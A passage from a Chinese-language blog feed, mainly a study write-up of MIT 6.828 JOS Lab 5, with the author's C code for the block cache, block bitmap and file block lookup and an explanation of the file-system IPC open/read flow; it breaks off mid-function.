src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031548493.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031548887.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Syntax-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab5</title>
      <link href="/2023/6.828-Lab5/"/>
      <url>/2023/6.828-Lab5/</url>
      
        <content type="html"><![CDATA[<p>最崩溃的一集…Lab倒是很简单,只是文件系统一启用,之前代码的好多问题都显现出来了,然后就是debugggg.</p><h2 id="Lab-5-File-system-Spawn-and-Shell"><a href="#Lab-5-File-system-Spawn-and-Shell" class="headerlink" title="Lab 5: File system, Spawn and Shell"></a>Lab 5: File system, Spawn and Shell</h2><h3 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>切换分支之后编译有点问题,改一改:</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310241258348.png"><br>在GNUmakefile中加上-Wno-address-of-packed-member</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310241423170.png"></p><p>将fs.h中定义的全局变量改为外部变量,并在fs.c中定义.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Super</span> *<span class="title">super</span>;</span><span class="comment">// superblock</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint32_t</span> *bitmap;<span class="comment">// bitmap blocks mapped in memory</span></span><br></pre></td></tr></tbody></table></figure><p>改下输出,lab4满分通过.</p><h3 id="File-system-preliminaries"><a href="#File-system-preliminaries" class="headerlink" title="File system preliminaries"></a>File system preliminaries</h3><p>文件系统的设计就不在这里说了,详见《HQOS 设计与实现》.</p><span id="more"></span><h3 id="The-File-System"><a href="#The-File-System" class="headerlink" title="The File System"></a>The File System</h3><h4 id="The-Block-Cache"><a href="#The-Block-Cache" class="headerlink" title="The Block Cache"></a>The Block Cache</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fault any disk block that is read in to memory by</span></span><br><span class="line"><span class="comment">// loading it from disk.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">bc_pgfault</span><span class="params">(<span class="keyword">struct</span> UTrapframe *utf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *addr = (<span class="type">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="type">uint32_t</span> blockno = ((<span class="type">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the fault was within the block cache region</span></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="type">void</span>*)DISKMAP || addr &gt;= (<span class="type">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">"page fault in FS: eip %08x, va %08x, err %04x"</span>,</span><br><span class="line">      utf-&gt;utf_eip, addr, utf-&gt;utf_err);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanity check the block number.</span></span><br><span class="line"><span class="keyword">if</span> (super &amp;&amp; blockno &gt;= super-&gt;s_nblocks)</span><br><span class="line">panic(<span class="string">"reading non-existent block %08x\n"</span>, blockno);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page in the disk map region, read the contents</span></span><br><span class="line"><span class="comment">// of the block from the disk into that page.</span></span><br><span class="line"><span class="comment">// Hint: first round addr to page boundary. fs/ide.c has code to read</span></span><br><span class="line"><span class="comment">// the disk.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 5: you code here:</span></span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_alloc(<span class="number">0</span>,addr,PTE_SYSCALL)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in bc_pgfault, sys_page_alloc: %e"</span>,r);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((r = ide_read(blockno*BLKSECTS,addr,BLKSECTS)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in bc_pgfault, ide_read"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">// Clear the dirty bit for the disk block page since we just read the</span></span><br><span class="line"><span class="comment">// block from disk</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"in bc_pgfault, sys_page_map: %e"</span>, r);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the block we read was allocated. (exercise for</span></span><br><span class="line"><span class="comment">// the reader: why do we do this *after* reading the block</span></span><br><span class="line"><span class="comment">// in?)</span></span><br><span class="line"><span class="keyword">if</span> (bitmap &amp;&amp; block_is_free(blockno))</span><br><span class="line">panic(<span class="string">"reading free block %08x\n"</span>, blockno);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flush the contents of the block containing VA out to disk if</span></span><br><span class="line"><span class="comment">// necessary, then clear the PTE_D bit using sys_page_map.</span></span><br><span class="line"><span class="comment">// If the block is not in the block cache or is not dirty, does</span></span><br><span class="line"><span class="comment">// nothing.</span></span><br><span class="line"><span class="comment">// Hint: Use va_is_mapped, va_is_dirty, and ide_write.</span></span><br><span class="line"><span class="comment">// Hint: Use the PTE_SYSCALL constant when calling sys_page_map.</span></span><br><span class="line"><span class="comment">// Hint: Don't forget to round addr down.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">flush_block</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> blockno = ((<span class="type">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="type">void</span>*)DISKMAP || addr &gt;= (<span class="type">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">"flush_block of bad va %08x"</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(va_is_mapped(addr)&amp;&amp;va_is_dirty(addr))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(ide_write(blockno*BLKSECTS,addr,BLKSECTS))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in flush_block, ide_write"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,addr,<span class="number">0</span>,addr,uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in flush_block, sys_page_map: %e"</span>,r);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="The-Block-Bitmap"><a href="#The-Block-Bitmap" class="headerlink" title="The Block Bitmap"></a>The Block Bitmap</h4><p>更改bitmap之后记得刷新bitmap对应块缓存.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">alloc_block</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// The bitmap consists of one or more blocks.  A single bitmap block</span></span><br><span class="line"><span class="comment">// contains the in-use bits for BLKBITSIZE blocks.  There are</span></span><br><span class="line"><span class="comment">// super-&gt;s_nblocks blocks in the disk altogether.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;super-&gt;s_nblocks;++i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(block_is_free(i))</span><br><span class="line">{</span><br><span class="line">bitmap[i/<span class="number">32</span>] &amp;= ~(<span class="number">1</span>&lt;&lt;(i%<span class="number">32</span>));</span><br><span class="line">flush_block((<span class="type">void</span>*)bitmap+BLKSIZE*(i/BLKBITSIZE));</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> -E_NO_DISK;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Find the disk block number slot for the 'filebno'th block in file 'f'.</span></span><br><span class="line"><span class="comment">// Set '*ppdiskbno' to point to that slot.</span></span><br><span class="line"><span class="comment">// The slot will be one of the f-&gt;f_direct[] entries,</span></span><br><span class="line"><span class="comment">// or an entry in the indirect block.</span></span><br><span class="line"><span class="comment">// When 'alloc' is set, this function will allocate an indirect block</span></span><br><span class="line"><span class="comment">// if necessary.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns:</span></span><br><span class="line"><span class="comment">//0 on success (but note that *ppdiskbno might equal 0).</span></span><br><span class="line"><span class="comment">//-E_NOT_FOUND if the function needed to allocate an indirect block, but</span></span><br><span class="line"><span class="comment">//alloc was 0.</span></span><br><span class="line"><span class="comment">//-E_NO_DISK if there's no space on the disk for an indirect block.</span></span><br><span class="line"><span class="comment">//-E_INVAL if filebno is out of range (it's &gt;= NDIRECT + NINDIRECT).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Analogy: This is like pgdir_walk for files.</span></span><br><span class="line"><span class="comment">// Hint: Don't forget to clear any block you allocate.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">file_block_walk</span><span class="params">(<span class="keyword">struct</span> File *f, <span class="type">uint32_t</span> filebno, <span class="type">uint32_t</span> **ppdiskbno, <span class="type">bool</span> alloc)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="keyword">if</span>(filebno &gt;= NDIRECT+NINDIRECT)</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"><span class="keyword">if</span>(filebno&lt;NDIRECT)</span><br><span class="line">{</span><br><span class="line">*ppdiskbno = &amp;(f-&gt;f_direct[filebno]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(f-&gt;f_indirect==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(alloc)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = alloc_block())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memset</span>(diskaddr(r), <span class="number">0</span>, BLKSIZE);</span><br><span class="line">f-&gt;f_indirect = r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -E_NOT_FOUND;</span><br><span class="line">}</span><br><span class="line">*ppdiskbno = &amp;(((<span class="type">uint32_t</span>*)(diskaddr(f-&gt;f_indirect)))[filebno-NDIRECT]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set *blk to the address in memory where the filebno'th</span></span><br><span class="line"><span class="comment">// block of file 'f' would be mapped.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_NO_DISK if a block needed to be allocated but the disk is full.</span></span><br><span class="line"><span class="comment">//-E_INVAL if filebno is out of range.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: Use file_block_walk and alloc_block.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">file_get_block</span><span class="params">(<span class="keyword">struct</span> File *f, <span class="type">uint32_t</span> filebno, <span class="type">char</span> **blk)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">uint32_t</span>* ppdisk;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="keyword">if</span>((r = file_block_walk(f,filebno,&amp;ppdisk,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(*ppdisk==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = alloc_block())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line">*ppdisk = r;</span><br><span class="line"><span class="built_in">memset</span>(diskaddr(r), <span class="number">0</span>, BLKSIZE);</span><br><span class="line">}</span><br><span class="line">*blk = diskaddr(*ppdisk);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h4><h5 id="用户文件读写流程分析"><a href="#用户文件读写流程分析" class="headerlink" title="用户文件读写流程分析"></a>用户文件读写流程分析</h5><h6 id="open"><a href="#open" class="headerlink" title="open"></a>open</h6><p>用户进程使用lib中的open函数,指定文件路径和以何种模式打开.open函数为进程分配一个未使用的文件描述符号fd,对应着0xD0000000处MAXFD个struct Fd结构中的一个.然后通过IPC进程间通信向fs server进程发送FSREQ_OPEN的请求.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> mode)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fd</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &gt;= MAXPATHLEN)</span><br><span class="line"><span class="keyword">return</span> -E_BAD_PATH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = fd_alloc(&amp;fd)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(fsipcbuf.open.req_path, path);</span><br><span class="line"></span><br><span class="line">fsipcbuf.open.req_omode = mode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = fsipc(FSREQ_OPEN, fd)) &lt; <span class="number">0</span>) {</span><br><span class="line">fd_close(fd, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> fd2num(fd);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>server进程接收到open请求,根据模式尝试打开(创建)文件:先调用openfile_alloc函数在opentab中分配一个struct OpenFile结构o,包括为o-&gt;fd分配物理页.然后调用file_open,从根目录开始遍历直到找到用户请求文件的struct File结构(JOS实现中目录的内容即是目录中的文件的struct File结构),设置o-&gt;file指向该结构.通过IPC通信的交互,最终实现将为o-&gt;fd分配的物理页映射到用户进程中该fd结构的对应虚拟地址.</p><p>这里理解一下openfile_alloc函数中的case1.当该opentab条目的o_fd还未使用过,分配一个物理页,此时pageref为1,再映射到用户,pageref为2,下一次打开文件就应该跳过这个条目.若pageref为1时,意味着除了fs server本身,已经没有用户进程使用该文件,所以该条目依然为free状态,可以分配.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate an open file.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">openfile_alloc</span><span class="params">(<span class="keyword">struct</span> OpenFile **o)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> i, r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Find an available open-file table entry</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXOPEN; i++) {</span><br><span class="line"><span class="keyword">switch</span> (pageref(opentab[i].o_fd)) {</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_alloc(<span class="number">0</span>, opentab[i].o_fd, PTE_P|PTE_U|PTE_W)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"><span class="comment">/* fall through */</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">opentab[i].o_fileid += MAXOPEN;</span><br><span class="line">*o = &amp;opentab[i];</span><br><span class="line"><span class="built_in">memset</span>(opentab[i].o_fd, <span class="number">0</span>, PGSIZE);</span><br><span class="line"><span class="keyword">return</span> (*o)-&gt;o_fileid;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> -E_MAX_OPEN;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>既然未来的读写操作都是server完成的,把o-&gt;fd映射到用户进程有什么用呢?从代码上能看出来的用途大概是1)对某文件打开模式的检查 2)将对特定文件类型(devid)的IO操作dispatch到特定的函数实现,如devfile,pipe,console.</p><p>(<del>这Fd映射还是以可写权限映射的,没道理</del>)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Dev</span> *<span class="title">devtab</span>[] =</span></span><br><span class="line">{</span><br><span class="line">&amp;devfile,</span><br><span class="line">&amp;devsock,</span><br><span class="line">&amp;devpipe,</span><br><span class="line">&amp;devcons,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Dev</span> <span class="title">devfile</span> =</span></span><br><span class="line">{</span><br><span class="line">.dev_id =<span class="string">'f'</span>,</span><br><span class="line">.dev_name =<span class="string">"file"</span>,</span><br><span class="line">.dev_read =devfile_read,</span><br><span class="line">.dev_close =devfile_flush,</span><br><span class="line">.dev_stat =devfile_stat,</span><br><span class="line">.dev_write =devfile_write,</span><br><span class="line">.dev_trunc =devfile_trunc</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h6 id="read"><a href="#read" class="headerlink" title="read"></a>read</h6><p>lib中的read函数根据文件的类型(devid)分发到特定的IO函数实现,这里以devfile_read为例.</p><p>向server发送FSREQ_READ请求,server从硬盘中读取对应文件数据到内存(别忘了JOS实现中是将整个3GB的硬盘映射到fs server的虚拟地址空间中)中,再经两次拷贝到用户进程要求的缓冲区中.</p><p>可以看出devfile_read设计成每次最多读取PGSIZE字节,因为这受限于我们的IPC机制.记得在server_read中处理参数n防止缓冲区溢出.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">devfile_read</span><span class="params">(<span class="keyword">struct</span> Fd *fd, <span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Make an FSREQ_READ request to the file system server after</span></span><br><span class="line"><span class="comment">// filling fsipcbuf.read with the request arguments.  The</span></span><br><span class="line"><span class="comment">// bytes read will be written back to fsipcbuf by the file</span></span><br><span class="line"><span class="comment">// system server.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">fsipcbuf.read.req_fileid = fd-&gt;fd_file.id;</span><br><span class="line">fsipcbuf.read.req_n = n;</span><br><span class="line"><span class="keyword">if</span> ((r = fsipc(FSREQ_READ, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">assert(r &lt;= n);</span><br><span class="line">assert(r &lt;= PGSIZE);</span><br><span class="line">memmove(buf, fsipcbuf.readRet.ret_buf, r);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>实现中的union Fsipc挺有意思.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Fsipc</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fsret_read</span> {</span></span><br><span class="line"><span class="type">char</span> ret_buf[PGSIZE];</span><br><span class="line">} readRet;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h6 id="write"><a href="#write" class="headerlink" title="write"></a>write</h6><p>和read区别不大.</p><h5 id="lab代码"><a href="#lab代码" class="headerlink" title="lab代码"></a>lab代码</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">   <span class="type">int</span></span><br><span class="line">   <span class="title function_">serve_read</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">union</span> Fsipc *ipc)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">Fsreq_read</span> *<span class="title">req</span> =</span> &amp;ipc-&gt;read;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">Fsret_read</span> *<span class="title">ret</span> =</span> &amp;ipc-&gt;readRet;</span><br><span class="line">       <span class="keyword">if</span> (debug)</span><br><span class="line">           cprintf(<span class="string">"serve_read %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line">       <span class="comment">// Lab 5: Your code here:</span></span><br><span class="line">       <span class="type">int</span> r;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">po</span>;</span></span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span> ((r = 